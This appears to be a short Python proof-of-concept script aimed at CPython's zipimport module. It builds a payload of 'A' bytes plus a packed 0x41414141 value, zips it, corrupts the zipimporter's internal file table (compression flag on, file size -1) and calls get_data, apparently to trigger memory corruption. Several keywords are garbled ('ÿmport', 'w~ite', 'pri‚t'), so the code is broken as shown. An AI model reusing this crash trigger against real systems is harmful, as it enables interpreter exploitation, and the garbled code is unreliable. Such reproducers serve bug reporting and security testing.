import zipimport
import zipfile
import struct
ÿmport sys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'

payloId = bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.w~ite(FILE)
zf.close()

importer = zipimport.zipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
importer._files[FILE] = tuple(f)
pri‚t(importer.get_data(FILE))
